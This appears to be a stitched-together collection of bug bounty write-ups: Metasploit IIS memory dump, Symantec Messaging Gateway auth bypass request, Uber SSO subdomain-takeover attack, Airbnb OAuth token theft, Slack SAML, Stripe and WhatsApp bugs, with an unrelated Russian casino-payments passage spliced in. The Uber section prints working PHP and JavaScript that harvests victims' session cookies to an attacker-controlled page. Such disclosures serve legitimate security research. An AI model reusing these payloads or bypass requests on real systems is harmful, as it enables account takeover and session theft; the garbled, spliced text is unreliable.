least, it lets you crash processes or the operating system. We have a metasploit module for this IIS vuln (always check there using search options) Setting metasploit module Press enter or click to view image in full size Response: The screen is beautiful but … no “critical” data at the time I performed the dump, regardless of that, the vulnerability was successfully confirmed, which was enough :) Metasploit memory dump module for IIS link here . Takeaways: As you have been able to observe, I have tried to focus more on the beginner community, showing how to look in a different way for those low impact vulns that are very common to find. I hope I have contributed in a way, just as I learn from all of you. Happy Hacking! Hope you liked it, now I have a twitter so we can share knowledge there also. Find me here .

Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов.

As a last resort option one may commit to an extensive research of the few software appliances the client has exposed. This approach will often yield results, as it was the case with Symantec Messaging Gateway. Like in most login interfaces a password reset feature is present. “Forgot password” link appears after unsuccessful login attempt. The username is prompted afterwards. What happens under the hood is that SMG creates a password reset link. It puts an encrypted token in the link in order to make sure that the password is reset by the genuine owner of the account. That’s where the vulnerability is present. The string format of the token before encryption is “username:password”. Sounds fair enough as this enables SMG to check the token against a valid user password. Incidentally, when we tried “admin:” for a token, the system behaved in an unusual way. It generated a valid administrator session! Of course the token is encrypted, so how do we get the key? Luckily there has been a previous research for a similar bug in Symantec Gateway. Philip Pettersson found an authentication bypass that encrypted a parameter in a similar manner. He talks about a hardcoded key: Fortunately, the encryption is just PBEWithMD5AndDES using a static password, conveniently included in the code itself. I won't include the encryption password or a fully encrypted notify string in this post. Indeed, the key is static across SMG installations. We won’t disclose the key in this post. If one encrypts the following string - “admin:” and passes it as a value for GET parameter “authorization” he will receive a valid admin session. Example request: GET /brightmail/action2.do?method=passwordReset&authorization=<..>%3d HTTP/1.1 Host: 192.168.17.15 Connection: close Cache-Control: max-age=0 Origin: https://192.168.17.15 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Expected response: HTTP/1.1 302 Found Server: Apache-Coyote/1.1 Cache-Control: no-store,no-cache Pragma: no-cache Expires: Thu, 01 Jan 1970 00:00:00 GMT X-Frame-Options: SAMEORIGIN Set-Cookie: JSESSIONID=97B8786DB8CC163EB2A4C595D1028E1D; Path=/brightmail; Secure; HttpOnly Location: /brightmail/viewWelcome.do?userID=1 Content-Type: text/html;charset=UTF-8 Content-Length: 0 Connection: close Surely enough the cookie generated is a valid administrator session: To our knowledge the vulnerability is only present if the password reset feature is enabled in the appliance.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAuthentication bypass on Uber’s Single Sign-On via subdomain takeover – Arne Swinnen Arne Swinnen Security Blog Menu Close Home Research Exploit Development Mobile Security Publications Web Security Contact 6 Authentication bypass on Uber’s Single Sign-On via subdomain takeover Posted on June 25, 2017 by Arne Swinnen TL;DR: Uber was vulnerable to subdomain takeover on saostatic.uber.com via Amazon CloudFront CDN. Moreover, Uber’s recently deployed Single Sign-On (SSO) system at auth.uber.com, which is based on shared cookies between all *.uber.com subdomains, was found vulnerable to session cookie theft by any compromised *.uber.com subdomain. Therefore, the impact of the subdomain takeover could be increased to Authentication Bypass of Uber’s full SSO system, yielding access to all *.uber.com subdomains protected by it (e.g. vault.uber.com, partners.uber.com, riders.uber.com, etc). Uber resolved the subdomain takeover vulnerability and granted a $5.000 bounty for the two combined issues. Single Sign-On security revisited Generally, SSO systems are (variations of) any of the following three types, in order of popularity: OAuth : Security is mainly based on whitelisted callback URLs of service providers configured at the identity providers, and CSRF protection via the “state” parameter. Flaws are often via open redirect chains, e.g. Authentication bypass on Airbnb via OAuth tokens theft. SAML & friends : Security is based on XML messages signed with pre-exchanged cryptographic keys between service and identity providers. Flaws are often XML Signature bypasses, e.g. OneLogin authentication bypass on WordPress sites that bit Uber before. Shared (session) cookies between subdomains : Security is based on the integrity of all subdomains. Any vulnerability on any subdomain that provides an attacker insight in the shared session cookies issued by the SSO system is fatal. Flaws are thus often RCE, debug logs exposure, subdomain takeover and friends on subdomains, e.g. Authentication bypass on Ubiquity’s Single Sign-On via subdomain takeover I personally believe that the first two in this list have had many problems in the past, but have improved lately in terms of security. The latter SSO based on shared session cookies between subdomains is more a technology from the past, before the former two even existed. By design, it enforces that anything that wants to leverage the SSO system to be a subdomain of the same TLD as where the SSO system is based. Since the security of the SSO system is based on the integrity of the subdomains (see aforementioned report and the Uber case below), this is quite an ironic situation. By design, it encourages to increase the attack surface enormously. Uber case Uber used OAuth as an SSO system for *.uber.com subdomains in the past, as can be seen from this recent public disclosure report by @ngalog : [Uber 8k Bug] Login CSRF + Open Redirect = Account Takeover . However recently, they’ve changed (reverted?) to a SSO system based on shared session cookies among subdomains of *.uber.com. If you now browse to any uber.com subdomain that requires authentication (e.g. central, partners, riders, vault, developer, …), you get redirected to auth.uber.com instead. Once you’ve logged in there and you visit another subdomain, you’re logged in there transparently via the SSO system at auth.uber.com, which issues temporary session cookies for every *.uber.com subdomain after being logged in once. A vulnerability was identified in this SSO system that allows any compromised subdomain on *.uber.com to transparently issue and steal valid session cookies issued for *any* uber.com subdomain by auth.uber.com, as long as the victim had already authenticated once to the SSO. Uber did have some countermeasures in place to prevent this, but these were bypassed and reported together with the subdomain takeover for increased impact. Any compromised *.uber.com subdomain could be used to perform the same attack, although Uber explicitly mentioned several *.uber.com subdomains as out of scope in their bug bounty program policy at the time of reporting (e.g. *.dev.uber.com, *.et.uber.com, drive.uber.com, etc). Subdomain takeover Subdomain saostatic.uber.com was pointing to Amazon Cloudfront CDN via a DNS CNAME, but the hostname was not registered there anymore (dangling pointer). This allowed me to fully takeover this domain, highly similar to Subdomain takeover on rider.uber.com due to non-existent distribution on Cloudfront by Frans Rosén . I effectively took over the subdomain as a Proof of Concept and hosted a simple HTML file as proof here: Authentication bypass In Uber’s SSO system, auth.uber.com acts as Identity Provider and issues temporarily shared session cookies for https://*.uber.com (“domain=uber.com” cookie attribute) to communicate identities to Service Providers (e.g. riders.uber.com, partners.uber.com, central.uber.com, vault.uber.com, developer.uber.com, and many more). Service Providers on their end immediately destroy the incoming temporary shared session cookies in case of erroneous (e.g. issued for other Service Provider) or successful authentication to ensure that the window for theft is small, as can be seen in the below Uber SSO Login diagram: The precious shared session cookie “_csid” can thus only be stolen between steps 9-12, which is a very short period (automatic browser redirects). Although not impossible to exploit (see Jack Whitton’s awesome CSP trick to block certain cookies from being sent to certain domains, coincidentally also on Uber’s bug bounty program ), a more convenient flaw was identified that allows the shared session cookie to remain alive after step 12 in the browser’s cookie store in the diagram above. The issue is that, if the victim is already logged in at https://riders.uber.com (situation after last step 12 in diagram) when receiving a request containing a valid newly generated shared session cookie “_csid” from auth.uber.com, it is simply ignored and remains usable. Hence it stays alive in the browser until its cookie store is cleared. An attacker simply needs to replay step 3 in the above diagram as step 13 and end with an additional hidden request to https://saostatic.uber.com to steal the precious session cookie: So once an attacker gets his/her hands on the victim’s “_csid” shared session cookie for https://riders.uber.com, he/she can execute the normal login flow in their own browser and replace the issued “_csid” cookie value in step 9 to be logged in as the victim, right? Wrong. Uber had another surpising countermeasure in place, namely a variant of login cross-site request forgery protection. This is the actual updated Uber SSO Login diagram: The problem here are the GET param state=CSRFTOKEN and locally scoped state cookie that are added in step 3 by the Service Provider riders.uber.com and verified in step 11. Since we can’t steal these values from the victim’s browser, but only the “_csid” shared session cookie, this means game over, right? Unfortunately, wrong. An attacker can obtain a proper CSRFTOKEN value and accompanying state cookie value from https://riders.uber.com by starting a normal login scenario on their end (e.g. in their own browser or via a simple script). He/she can then relay the auth.uber.com URL generated by https://riders.uber.com in their own browser in step 3 to the victim’s browser to generate & steal the “_csid” shared session cookie for these values, and inject these in his/her own browser login scenario again in step 9. In this manner, the victim effectively generates the “_csid” temporary session token for the attacker’s login scenario in a separate browser, but this works flawlessly (e.g. no IP-based checks between steps were encountered). This still allows exploitation and thus victim impersonation in the following manner (we still assume that the victim is already logged in to auth.uber.com and visits a webpage under control by the attacker, so we basically continue the flow from the above diagram): Proof of concept A PoC says more than a thousand diagrams. In the PoC steps sent to Uber & showcased in the video below, the assumption is made that https://saostatic.uber.com is actually serving a valid SSL certificate in the victim’s browser, which was not the case. However, it could’ve easily been generated with Let’s Encrypt . Open the victim’s browser & browse to https://riders.uber.com. After being redirected to https://auth.uber.com, login with the victim’s credentials so you end up on https://riders.uber.com trips dashboard again. Open a second browser tab in the victim’s browser and browse to https://saostatic.uber.com/prepareuberattack.php. Accept any certificate warnings that you may receive here – again, we’re only simulating that the domain has a valid SSL certificate. Once the page has finished loading you should see a URL, “Cookie: ” string and a “Set-Cookie: ” strings underneath each other. This is all info gathered under the hood by the attacker’s webserver that is required to login as the victim now – everything has been stolen automagically. Open the separate attacker’s browser and setup an intercepting proxy tool to intercept requests and responses. Browse to the URL displayed on the prepareuberattack.php page output and intercept this request. Now copy the “Cookie: …” string displayed on prepareuberattack.php and paste it into the request headers. The response should be a redirect to https://riders.uber.com/trips, indicating successful authentication bypass. Last but not least, copy all the “Set-Cookie: ” lines from the prepareuberattack.php page output and paste them in the response before forwarding it to the browser. This ensures that the stolen cookies are permanently injected in the attacker’s browser. You are now logged in as the victim in the attacker’s browser. In a real attack scenario, an attacker would stealthily load https://saostatic.uber.com/prepareuberattack.php in the victim’s browser, e.g. through an iframe. Likewise, he/she would probably not display the URL and all the cookies on the resulting page, but store this on the server-side, ready to be abused in a stealthy fashion. Although it’s a lengthy explanation, the PoC video showcases how quick & effective exploitation by an attacker can be. The code of the https://saostatic.uber.com/prepareuberattack.php and https://saostatic.uber.com/uberattack.php pages is provided below. This was written quick & dirty for PoC purposes, but it did the job: prepareuberattack.php PHP <html> <body> <script> <?php function HandleHeaderLine( $curl, $header_line ) { preg_match(\"/state=([^;]*);/\", $header_line, $matches); if(sizeof($matches) > 0) { print(\"var cookiestate = '\" . $matches[1] . \"';\\n\"); } preg_match(\"/Location: (.*)/\", $header_line, $matches); if(sizeof($matches) > 0) { print(\"var loc = '\" . trim($matches[1]) . \"';\\n\"); } return strlen($header_line); } $c = curl_init('https://riders.uber.com'); curl_setopt($c, CURLOPT_VERBOSE, 1); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_HEADERFUNCTION, \"HandleHeaderLine\"); $page = curl_exec($c); ?> var csrf = loc.substring(loc.lastIndexOf(\"=\")+1); var img = document.createElement(\"IMG\"); img.onerror = function () { var iframe = document.createElement(\"iframe\"); iframe.setAttribute(\"src\",\"https://saostatic.uber.com/uberattack.php?cookiestate=\" + encodeURIComponent(cookiestate) + \"&csrftoken=\" + csrf); iframe.setAttribute(\"width\", \"100%\"); iframe.setAttribute(\"height\", \"10000\"); document.body.appendChild(iframe); } img.src=loc; </script> </body> </html> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 < html > < body > <script> < ? php function HandleHeaderLine ( $ curl , $ header _ line ) { preg_match ( \"/state=([^;]*);/\" , $ header_line , $ matches ) ; if ( sizeof ( $ matches ) > 0 ) { print ( \"var cookiestate = '\" . $ matches [ 1 ] . \"';\\n\" ) ; } preg_match ( \"/Location: (.*)/\" , $ header_line , $ matches ) ; if ( sizeof ( $ matches ) > 0 ) { print ( \"var loc = '\" . trim ( $ matches [ 1 ] ) . \"';\\n\" ) ; } return strlen ( $ header_line ) ; } $ c = curl_init ( 'https://riders.uber.com' ) ; curl_setopt ( $ c , CURLOPT_VERBOSE , 1 ) ; curl_setopt ( $ c , CURLOPT_RETURNTRANSFER , 1 ) ; curl_setopt ( $ c , CURLOPT_HEADERFUNCTION , \"HandleHeaderLine\" ) ; $ page = curl_exec ( $ c ) ; ? > var csrf = loc . substring ( loc . lastIndexOf ( \"=\" ) + 1 ) ; var img = document . createElement ( \"IMG\" ) ; img . onerror = function ( ) { var iframe = document . createElement ( \"iframe\" ) ; iframe . setAttribute ( \"src\" , \"https://saostatic.uber.com/uberattack.php?cookiestate=\" + encodeURIComponent ( cookiestate ) + \"&csrftoken=\" + csrf ) ; iframe . setAttribute ( \"width\" , \"100%\" ) ; iframe . setAttribute ( \"height\" , \"10000\" ) ; document . body . appendChild ( iframe ) ; } img . src = loc ; </script> < / body > < / html > uberattack.php PHP <html> <body> <?php $cookiestring = \"state=\" . $_GET[\"cookiestate\"] . \"; \"; $interestincookies = array(\"_udid\", \"_csid\", \"sid\"); foreach ($_COOKIE as $name => $value) { if (in_array($name,$interestincookies)) { $cookiestring = $cookiestring . $name . \"=\" . str_replace(' ', '+', $value) . \"; \"; $cookiestringset = $cookiestringset . \"Set-Cookie: \" . $name . \"=\" . str_replace(' ', '+', $value) . \";</br>\"; } } print \"Url: \" .

By simply changing “riders.uber.com” to any other subdomain of uber.com in these two PHP files, an attacker could generate valid sessions for these subdomains on behalf of the victim, e.g. vault.uber.com, partners.uber.com, developer.uber.com, … Recommendations The recommendations provided to Uber were twofold: Resolve the subdomain takeover of saostatic.uber.com by removing the dangling CNAME to AWS CloudFront CDN. Resolve the Authentication Bypass issue by any of the following, in order of priority: Revert the SSO system back to OAuth 2, since this does not have the side-effect of actually encouraging a large attack surface like the current shared session SSO system. Or, implement an IP address check: Store a user’s external IP address when issuing a shared “_csid” session cookie on auth.uber.com (identity provider) and verify that users presenting this shared session cookie to service providers on *.uber.com have the same external IP address, to prevent relay attacks like the one described above. There is a residual risk here, namely when the attacker has the same external IP address as its victim (e.g. on the same corporate network/wireless access point/…).

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAuthentication bypass on Airbnb via OAuth tokens theft – Arne Swinnen Arne Swinnen Security Blog Menu Close Home Research Exploit Development Mobile Security Publications Web Security Contact 5 Authentication bypass on Airbnb via OAuth tokens theft Posted on June 22, 2017 by Arne Swinnen TL;DR: Login CSRF in combination with an HTTP Referer header-based open redirect in Airbnb’s OAuth login flow, could be abused to steal OAuth access tokens of all Airbnb identity providers and eventually authenticate as the victim on Airbnb’s website and mobile application. This attack did not rely on a specific OAuth identity provider app configuration flaw (e.g. wildcards in whitelisted redirect_uri URLs), which made it generic for all Airbnb’s identity providers (Facebook & Google at the time of reporting). Airbnb fixed both the login CSRF and open redirect issues and awarded a $5.000 bounty back in the summer of 2016. OAuth token theft revisited Most (if not all) publicly available examples of OAuth token theft attacks rely on modification of the redirect_uri parameter value in the call to an identity provider in order to steal either an authorization code or an access_token from an authenticated victim. This requires a non-exact match of redirect_uri configured values (e.g. wildcards for subdomains or paths in the URL) for the service provider’s application on the identity provider’s end. Although the attacks are similar, their associated technique and impact is different: authorization code : Typically stolen via cross-domain leakage of the callback URL, which contains the precious authorization “code” GET parameter value that is appended to the redirect_uri URL by the identity provider upon redirection. A common example is theft via HTTP Referer header when loading cross-domain resources . Impact is typically authentication bypass on the service provider’s end, as the stolen “code” can be used to login as the victim there. access_token: Typically stolen via a cross-domain open redirect chain, since the access_token is communicated back via an URL’s location fragment (aka location.hash) by the identity provider, which survives cross-domain server-side redirects in all modern browsers. Impact is typically access to the victim’s identity provider with permissions of the service provider’s application there. Here’s a great example of a vulnerable Slack application on Facebook by Frans Rosén (golden oldie) . However, I made some new observations during investigation of Airbnb’s OAuth setup, namely: Redirect_uri modification to steal authorization codes is no more . All major identity providers have implemented an extra server-side check when service providers attempt to exchange an authorization code for an access token, which ensures the redirect_uri has not been tampered with earlier ( Facebook , Google ). This is a good thing. Major identity providers are not allowing wildcards in whitelisted redirect_uri lists anymore by default . They are a dying breed, mainly legacy applications are still vulnerable. This is a good thing. Theft of access_token can also result in authentication bypass . Quite often, websites of service providers use the “authorization code” flow to perform a login, but their mobile application utilizes locally stored access_tokens of the identity providers. Simply by replacing the stored access_token on a rooted mobile phone with a stolen access_code from a victim, an attacker can authenticate as a victim on the service provider’s mobile app instead. This is not a good thing. Airbnb case In the case of Airbnb, no tampering of redirect_uri’s for both the Airbnb apps for Facebook and Google was allowed, only a list of localized Airbnb sites was permitted here. However, the Airbnb mobile application did use an identity provider’s long-term access_token to authenticate a user transparently under the hood, which gave us means to increase the impact to authentication bypass, in case we were able to steal an access_token. Open redirect in OAuth endpoint If an unauthenticated user browsed to a page on www.airbnb.com that required authentication (e.g. https://www.airbnb.com/users/edit), he/she was redirected to the login page. However, after successfully logging in, the user was automatically redirected back to the original page he/she requested initially. This functionality was implemented through Airbnb’s redirect_params controller, which was not found vulnerable for external open redirect vulnerabilities. However, if the user was already logged in to Airbnb when returning from an identity provider, the /oauth_callback endpoint would automatically redirect the user based on the HTTP Referer header in the initiating OAuth login call to /oauth_connect. This redirect-back-after-login functionality in the OAuth flow while already being logged in was thus solely based on the HTTP Referer header, which can be controlled by an attacker by design. The vulnerability is demonstrated in the PoC video below. First, we open two airbnb.com/login browsers. In the first, we try to reach /users/edit, which results in extra redirect_params controller GET parameters being added to our URL. After successfully logging in in the first Airbnb browser tab, we now again “Log in with Facebook” via the second browser tab. By manually changing the HTTP Referer header in the call to https://www.airbnb.cat/oauth_connect and then successfully logging in on Facebook, the user will end up on the changed Referer value’s website eventually. Important to note is that the user must be successfully logged in in order for the final redirect to proceed. Of course, this movie only demonstrates the root cause of the vulnerability, not a practical exploitation. For that to succeed, an attacker must achieve three additional things: forge a request to the vulnerable endpoint with an arbitrary HTTP Referer header (1) while being authenticated to Airbnb (2) and get some sensitive data such as OAuth tokens in the URL (3) to effectively steal something useful. Making a request to the vulnerable endpoint with an arbitrary HTTP Referer header is quite easy: Simply embedding an external resource in a web page under the attacker’s control will make the browser send the Referer header with value this website’s page automatically. OAuth Login CSRF & OAuth token theft The not-so-precious-anymore OAuth authorization code value, which is communicated back in GET parameters to the Airbnb endpoint by Facebook & Google, gets lost during the redirections. However, both identity providers also offer communication of access_tokens via an URL fragment (the part after a hashtag in a URL) as opposed to URL parameters. URL fragments only exist on the client-side and are properly preserved by the browser during redirects and accessible from JavaScript, even by the last page in the redirection chain which is on a completely different origin. However, there are some additional problems: If we want to retrieve URL fragments from the identity providers to steal later on, we must be able to modify the OAuth request call to the provider (add “token” to the response_type parameter). However, this request is sent only after the initiating call to Airbnb OAuth endpoint https://www.airbnb.cat/oauth_connect in which the open-redirect-via-HTTP-referer-header exists, which is necessary for the overall attack. Airbnb’s callback endpoint expects an authorization code via a URL GET Parameter from the identity provider. However, when receiving a URL fragment instead, it will consider the authentication attempt invalid and hence not perform the final redirect, since we are not logged in. These two issues were both solved by exploiting a Login CSRF vulnerability via the same OAuth endpoint, as an OAuth login is initiated via a forgeable GET call to https://www.airbnb.cat/oauth_connect. An attacker first transparently logs in his/her victim unknowingly to their own Airbnb account via an identity provider, hereby planting the redirection seed via the HTTP Referer header. Now the victim is authenticated to Airbnb. Note that there was proper OAuth CSRF protection in place (“state” parameter), but since we are authenticating the victim into his/her own account, this does not prevent anything here. What is peculiar is that any additional OAuth authentication flow that follows will follow exactly the same path, regardless of whether it was successful or not! Now, when the attacker again forces the victim to make an additional Login via Facebook/Google but with response_type code,token as opposed to the normal code , the redirection flow of earlier will still work. Concretely, since we are still logged in, a redirect to the arbitrary HTTP Referer header’s value planted earlier will occur, this time with the URL fragments containing the victim’s identity provider OAuth tokens. Two PoCs were designed, one for each identity provider. The idea is exactly the same: Victim is authenticated to Facebook/Google in browser tab and has an Airbnb account linked to them, but is not necessarily logged in to Airbnb. Victim opens a website under the attacker’s control (https://www.arneswinnen.net/airbnb.com.<IDP>.html in the POC video) The attacker’s website will first unknowingly login the victim to Airbnb. In order not to interfere with potentially existing Airbnb sessions (in case the victim is currently browsing Airbnb), we chose to use the www.airbnb.cat localized domain in this PoC. By performing this login CSRF from the attacker’s owned website, the HTTP Referer header in the request to the Airbnb OAuth login endpoint will hold the value of the attacker’s website, hereby planting the seed. Once the victim is unknowingly logged in to www.airbnb.cat, the attacker now makes another Airbnb OAuth authentication request on behalf of the victim. However, this time the request is directly made to Facebook/Google (2nd step in normal OAuth flow), hereby allowing the attacker to set the response_type of the token to “code,token” (URL Fragments) as opposed to “code” (URL Parameters). Note that we keep the exact same value for the redirect_uri parameter. Since the victim is currently logged in and the previously injected redirect to https://www.arneswinnen.net/airbnb.com.<IDP>.html is still valid, the OAuth tokens in the URL Fragments of the IDP response will end up on the attacker’s website. Here, a simple JavaScript statement can read the URL Fragment in the browser, and effectively steal the OAuth values for both “code” and “token”. An attacker now gained two things: “code” OAuth token, which can be used to authenticate to airbnb.com as the victim. This is because the redirect_uri has not been changed during our attack, we only changed the communication of it from a GET parameter to an URL fragment (see step 4). “access_token” OAuth token, which can be used to query information of the victim at the Identity Provider and authenticate as the victim user on the Airbnb mobile application.

IT Security. Bug Bounty Hunter. 5 Comments Reply June 23, 2017 Raynold Hi Arne, Great fan of your bug bounty work. In your first video, when logging in with the modified referer header, you get redirected to the url in the referer header from /oauth_callback. However, in your second and third videos, for the first OAuth request made to /login, you get redirected to airbnb.cat from /authenticate even though the referer header has your URL. It seems like only /oauth_callback does the open redirection based on referer header. So, I have a couple of questions: 1) Did /authenticate always redirect to the top url instead of the referer header? 2) Why did the first video’s flow only end at /oauth_callback before redirecting to your domain, while the second and third videos make a request to /authenticate? They all begin in the same non-login state, so they should have the same flow right? Hope to hear from you soon =) Regards, Raynold Reply June 23, 2017 Arne Swinnen Hi Raynold, Great observation, I did not explain this 100% correctly. The external open redirect only occurred when you were already logged in and initiated another OAuth login flow through an identity provider (the /oauth_connect and /oauth_callback endpoints indeed). I have updated the blogpost and the first PoC video to explain this more clearly. Arne Reply June 23, 2017 fois Great work, congrats on the bounty! Thanks very much for the detailed info!

Here’s the full content:\n\nSlack SAML authentication bypass Skip to main content Into the symmetry Search Search This Blog Slack SAML authentication bypass October 26, 2017 tl;dr I found a severe issue in the Slack 's SAML implementation that allowed me to bypass the authentication. This has now been solved by Slack. Introduction IMHO the rule #1 of any bug hunter (note I do not consider myself one of them since I do this really sporadically) is to have a good RSS feed list. In the course of the last years I built a pretty decent one and I try to follow other security experts trying to \"steal\" some useful tricks. There are many experts in different fields of the security panorama and too many to quote them here (maybe another post). But one of the leading expert (that I follow) on SAML is by far Ioannis Kakavas . Indeed he was able in the last years to find serious vulnerability in the SAML implementation of Microsoft and Github . Usually I am more an \"OAuth guy\" but since both, SAML and OAuth, are nothing else that grandchildren of Kerberos learning SAML has been in my todo list for long time. The Github incident gave me the final motivation to start learning it. Learning SAML As said I was a kind of SAML-idiot until begin of 2017 but then I decided to learn it a little bit. Of course I started giving a look the the specification, but the best way I learn things is by doing and hopefully breaking. So I downloaded this great Burp extension called SAML Raider (great stuff, it saves so much time, you can edit any assertion on the fly). Then I tried to look if any of the service that routinely I use are SAML compliant. It turns out that many of them are. To name some: Github (but I guess Ioannis already took all the bugs there). So ping next (I actually found this funny JS Github bug giving a look into it, but not pertinent here) Hackerone , I gave a try here but nada, nisba, niente, nicht, niet Slack, Bingo see next section (this is probably meant for Enterprise customers) Slack SAML authentication bypass As said many of the service I use in my routine are SAML aware so I started to poke a bit them. The vulnerability I found is part of the class known as \" confused deputy problem \". I already talked about it in one of my OAuth blog post (tl;dr this is also why you never want to use OAuth implicit grant flow as authentication mechanism) and is really simple. Basically SAML assertions, between others contains an element called Audience and AudienceRestriction . Quoting Ioannis : The Assertion also contains an AudienceRestriction element that defines that this Assertion is targeted for a specific Service Provider and cannot be used for any other Service Provider. This means that if I present to a ServiceProvider A an assertion meant for ServiceProvider B, then the ServiceProvider A shoud reject it. Well between all other things I tried this very really simple attack against a Slack's SAML endpoint /sso/saml and guess what? It worked :o !! To be more concrete I used an old and expired ( yes the assertion was also expired!!) Github's Assertion I had saved somewhere in my archive that was signed for a subject different than mine (namely the username was not asanso aka me) and I presented to Slack. Slack happily accepted it and I was logged in Slack channel with the username of this old and expired Assertion that was never meant to be a Slack one!!! Wow this is scary.... Well well this look bad enough so I stopped quite immediately and open a ticket on Hackerone .... Disclosure timeline ...here the Slack security team was simply amazing... Thanks guys 02-05-2017 - Reported the issue via Hackerone. 03-05-2017 - Slack confirmed the issue. 26-08-2017 - Slack awarded a 3000$ bounty but still working with the affected customers in order to solve the vulnerability. Hence the ticket was kept open. 26-10-2017 - Slack closed the issue Acknowledgement I would like to thank the Slack security team in particular Max Feldman you guys rock, really!!

This issue got assigned CVE-2016-0701 with a severity of High and OpenSSL 1.0.2 users should upgrade to 1.0.2f. If an application is using DH configured with parameters based on primes that are not \"safe\" or not Lim-Lee (as the one in RFC 5114 ) and either Static DH ciphersuites are used or DHE ciphersuites with the default OpenSSL configuration (in particular SSL_OP_SINGLE_DH_USE is not set) then is vulnerable to this attack. It is believed that many popular applications (e.g. Apache mod_ssl) do set the SSL_OP_SINGLE_DH_USE option and would therefore not be at risk (for DHE ciphersuites), they still might be for Static DH ciphersuites.

Here’s the full content:\n\nInspect Element leads to Stripe Account Lockout Authentication Bypass - Jon's Personal Blog Jon's Personal Blog Jon's Personal Blog Home About Me Blog Twitter LinkedIn YouTube April 3, 2017 Inspect Element leads to Stripe Account Lockout Authentication Bypass A common thing I see happening with many popular applications is that a developer will disable an HTML element through the “class” attribute. It usually looks something like this: <a href=\"#\" name=\"disabled_button\" class=\"button small grey disabled\"> This works pretty well in some situations, but in other situations it can be manipulated to perform actions that really shouldn’t be done by an unauthenticated user. That’s exactly what happened in a bug I submitted to Stripe a few weeks ago. When you are logged into your Stripe account, you will be timed out after a certain amount of inactivity. Once this you reach this timeout, you aren’t able to make any changes on the account or view other pages until you re-authenticate by entering your password. Herein lies the problem with using a “disabled” class tag – an attacker can simply manipulate the page through inspect element to allow them to delete the disable class tag and view other pages, allowing them to send requests. In this video below, you’ll see how I’m locked out of a Stripe account because of inactivity, but by navigating to the “invite user” section of the timeout page through inspect element, I am able to invite myself as an administrator on the account that is timed out, without authenticating first. This, of course, requires a person to first be logged in to their Stripe account and leave their computer out in the open… but using this method you can render the entire lockout process completely useless on a Stripe.com account. It’s interesting nonetheless that the folks at Stripe made sure that a malicious user couldn’t change the web hooks… but inviting an administrator to the account is completely allowed. Stripe followed up and clarified by saying that simply dismissing the entire modal isn’t enough to bypass the authentication check, it is instead checked at the backend, but that check was accidentally removed in this situation which allowed me to invite another administrator. Stripe security was very responsive in resolving this issue and it was fixed shortly after I reported it. I asked permission before publishing this article. Bounty: $500. I have some more bounty writeups that are a bit more technical than this one coming soon, including a writeup on a CVE I discovered, so check back later for more updates.

Well, let’s introduce it. During my bug-hunting career I was always looking for a bug on Facebook, and I always try to find something into their acquisitions, subdomains and main domain, but all I got was a lot of duplicates and some bugs gets rejected anyway I don’t give up (XSS, CSRF,Broken Authentication and Session Management, etc..) and one day I had a brillian idea: find something on whatsapp,Facebook is a acquired more than 50 companies, including WhatsApp. The WhatsApp acquisition closed at a steep $19 billion the WhatsApp app that is available for Android and IOS and Windows phone and pc too. As you know, on WhatsApp you can chat with your WhatsApp-friends..so I was thinking a lot about what type of bug I can found and..yes, the simplest bug ever, DOS. Before this experience, I saw that some researchers founded some similar bugs into Facebook main domain and facebook messenger app, so I taught ..”i can “, then I start hunting. Honestly my idea was to find a Buffer Overflow (it was a bad idea because I wasn’t clear about that :) ) bug but then, after some research that released that is completely different if we talk about Buffer Overflow and Dos. In fact, I’ve reported this bug, with this title: “Buffer Overflow vulnerability on WhatsApp Messenger android app”, but I was wrong, was just a simple Dos; anyway Facebook Security team accepts this issue, and that’s what matters! :) I was thinking about crash the WhatsApp app by sending one message wich contains a malicious payload or special characters to a victim. This is the best part guys, how I ve found these special characters for the dos bug..Have you ever seen on facebook, these kind of characters on your timeline : https://pastebin.com/7aSNKVaV , check the special characetrs here..you can imagine what I idea I had. (Best idea ever..cause sometime we need to use our immagination in order to find something interesting) I decided to make up a contact file and add up few emojis + “special characters” in the area of Contact name that is shared .Then I shared this contact victom . I opened his chat the mobile screen turned black and bamm whatsapp crashed my sometime prompt to restart !! At first, Facebook security team doesn’t understand my issue, but after a clarifition they sended my issue to the appropriate team Hi Vishnu, We have looked into this issue and believe that the vulnerability has been patched. Please follow up with us if you believe that the patch does not resolve this issue. Thanks, Aaron Security And on Mar 4 the released the new Messenger APP for IOS/Android that contained the fix for my issue..and yes, I got 500$ as bounty: Hi Vishnu Vishnu, After reviewing this issue, we have decided to award you a bounty of $500. Below is an explanation of the bounty amount. We fulfill our bounties through Bugcrowd. While no private user information was at risk to be exposed, this is nevertheless a behavior that made it possible to crash/freeze WhatsApp, and a fix was implemented by the team. Thank you again for your report.

